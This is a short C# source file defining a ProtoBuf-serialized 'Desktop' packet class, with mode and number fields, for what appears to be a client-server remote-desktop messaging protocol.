using ProtoBuf;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class Desktop : IPacket
    {
        [ProtoMember(1)]
        public int Mode { get; set; }

        [ProtoMember(2)]
        public int Number { get; set; }

        public Desktop() { }
        public Desktop(int mode, int number)
        {
            this.Mode = mode;
            this.Number = number;
        }

        public void Execute(Client client)
        {
            client.Send<Desktop>(this);
        }
    }
}
